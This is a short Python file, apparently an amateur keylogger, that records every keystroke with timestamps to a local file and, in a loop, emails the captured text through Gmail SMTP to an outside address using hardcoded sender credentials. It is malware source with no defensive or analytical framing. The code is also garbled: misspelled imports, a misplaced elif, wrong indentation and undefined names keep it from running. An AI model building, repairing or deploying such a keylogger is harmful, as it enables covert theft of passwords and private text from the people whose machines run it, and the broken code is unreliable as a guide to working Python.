import keyboard
import datatime
impoert smtplib
from email.mime.text import MIMEText
import time
# @Lolita
word = ""
interval = 20
file = open("key_log.txt", "w") 

def on_press(key):
    global word
    if key.name in ["space","enter"]:
         with open ("key_log.txt" , "a") as file :
             file.write(word + " " + " Date :" + str(datatime.datetime.now())+ "\n")
             word = ""
             elif key.name == "backspace":
                 word = word[:-1]
     else:
         word += key.name
         keyboard.on_press(on_press)
         while true:
             with open ("key_log.txt") as file:
                 data = file.read()
                 
                 if date :
                     msg = MIMEText(data)
                     msg["Subject"] = "KeyLogger Data"
                     msg["From"] = "Lolita@gmail.com"
                     msg["To"] = "raze.r@gmail.com"
                     
                     mail = smtplib.SMTP('smtp.gmail.com' , 587)
                     mail.ehlo()
                     mail.starttls()
                     mail.login('Lolita@gmail.com', '74vdsakol')
                     mail.sendmail("Lolita@gmail.com","raze.r@gmail.com", msg.as_string())
                     mail.close()
                     
                     with open ("key_log.txt","w") as file:
                         file.write("")
                         time.sleep(interval)
         
